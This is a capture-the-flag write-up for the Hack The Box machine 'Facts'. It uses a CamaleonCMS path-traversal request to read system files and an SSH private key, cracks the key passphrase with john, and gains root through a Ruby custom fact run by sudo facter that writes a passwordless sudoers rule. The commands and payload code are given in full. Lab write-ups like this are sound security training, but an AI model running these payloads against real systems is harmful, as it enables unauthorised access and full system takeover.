# Facts — Hack The Box, Easy, Linux

**TL;DR:** Open CamaleonCMS registration gives a low-priv account; **CVE-2026-1776**
(`download_private_file?file=..`) reads arbitrary files as the app user — which is
`trivia`, so you read `trivia`'s own SSH key, crack its passphrase, and log in.
`sudo facter` then runs a Ruby custom fact as root (facter drops privileges for
shelled-out commands but not for in-process Ruby) → root file write → root.

## Recon

```
$ nmap -Pn -p- 10.129.x.x
22/tcp    open ssh    OpenSSH 9.9p1 (Ubuntu 24.04)
80/tcp    open http   nginx 1.26.3
54321/tcp open        MinIO (S3)
```

Port 80 redirects to `facts.htb`, a **CamaleonCMS** site (Rails: `_factsapp_session`
cookie, theme `camaleon_first`, `/assets/camaleon_cms/admin`). 54321 is MinIO —
`AccessDenied` anonymously, no default creds, CVE-2023-28432 patched. The CMS is the way in.

## Foothold — register, then CVE-2026-1776

`/admin/register` is open (only an image captcha; OCR it in a loop until a submit
redirects to `/admin/login`). Logging in lands a low-privilege `/admin/dashboard`.

CamaleonCMS ≥ 2.4.5.0, ≤ 2.9.1 has **CVE-2026-1776**: a path traversal in the AWS/S3
uploader's `download_private_file`, which — unlike the local uploader — skips the
`valid_folder_path?` check. Any authenticated user reads arbitrary files:

```
GET /admin/media/download_private_file?file=../../../../../../etc/passwd   (low-priv session)

root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

The read runs **as the app user**. `william/user.txt` is world-readable:

```
?file=../../../../../../home/william/user.txt   ->   <user flag redacted>
```

## Identify the app user

Reading the app tree (cwd = `/proc/self/cwd`) yields the SQLite DB, `config/master.key`
(which decrypts `credentials.yml.enc` → `secret_key_base`), and the admin's bcrypt +
`auth_token` from `cama_users`. CamaleonCMS auth is a plain `auth_token` cookie bound
to the client IP — `auth_token=<admin_token>&M&<my_ip>` gives the full admin panel —
but admin→RCE is unnecessary once you read the service unit:

```
?file=../../../../../../etc/systemd/system/factsapp.service

User=trivia
ExecStart=/opt/.local/share/gem/bin/rails server -e production -b 127.0.0.1 -p 3000
```

The app runs as **trivia**, so the read primitive *is* trivia and can read trivia's
own private files:

```
?file=../../../../../../home/trivia/.ssh/id_ed25519
<OpenSSH key blob — aes256-ctr / bcrypt, passphrase-protected>
```

## User — crack the key passphrase

```
$ ssh2john id_ed25519 > k.john ; john --wordlist=rockyou.txt k.john
dragonballz   (id_ed25519)
$ ssh-keygen -p -f id_ed25519 -P dragonballz -N ''
$ ssh -i id_ed25519 trivia@facts     # uid=1000(trivia)
```

## Root — sudo facter

```
trivia may run: (ALL) NOPASSWD: /usr/bin/facter
```

Puppet's `facter` loads **custom facts** (Ruby) from a `--custom-dir`. Backtick/`system`
payloads run as *trivia* — facter drops privileges for shelled-out commands. But
in-process Ruby runs as root (`Process.euid == 0`), so do the work in pure Ruby:

```ruby
Facter.add(:pwn) do
  setcode do
    File.write("/tmp/root.txt", File.read("/root/root.txt"))
    File.write("/etc/sudoers.d/zz_pwn", "trivia ALL=(ALL) NOPASSWD:ALL\n")
    File.chmod(0440, "/etc/sudoers.d/zz_pwn")
    "x"
  end
end
```

```
$ sudo /usr/bin/facter --custom-dir /tmp/.f pwn
$ sudo -l    # (ALL) NOPASSWD: ALL
$ sudo bash -c 'cat /root/root.txt'   ->   <root flag redacted>
```

(`facter` runs under `use_pty`, so allocate a TTY, e.g. `ssh -tt`.)

## Why it fell
- CamaleonCMS a version behind → authenticated arbitrary read.
- The web app runs as a real SSH user → a read bug leaks that user's own key.
- A `sudo` grant for a tool that loads user-supplied Ruby → root.

## Things that cost time
- Chasing CamaleonCMS admin→RCE (the `select_eval` custom field evals its "Command
  to Eval") before realising the read primitive alone reached a shell, because the
  app runs as `trivia` and its key was directly readable.
- Rails CSRF blocks admin POST/DELETE with only the `auth_token` cookie (no session).
- Assuming facter's `system`/backticks run as root — they don't; only in-process
  Ruby stays root.
